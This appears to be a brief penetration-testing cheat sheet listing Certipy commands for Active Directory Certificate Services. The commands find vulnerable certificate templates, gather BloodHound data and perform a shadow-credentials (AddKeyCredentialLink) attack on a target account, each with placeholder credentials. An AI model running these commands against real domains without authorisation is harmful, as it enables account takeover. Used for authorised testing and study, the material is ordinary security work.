### Source
https://github.com/ly4k/Certipy  

### Check for vulnerable templates
```
certipy find '<domain>/<user>:<password>@<domainController>'
```

### Collect data for bloodhound
```
certipy find '<domain>/<user>:<password>@<domainController>' -bloodhound
```

### AddKeyCredentialLink
```
certipy shadow auto '<domain>/<user>:<password>'@<certificateAuthorityRhost> -account '<targetComputerOrUser>'
```

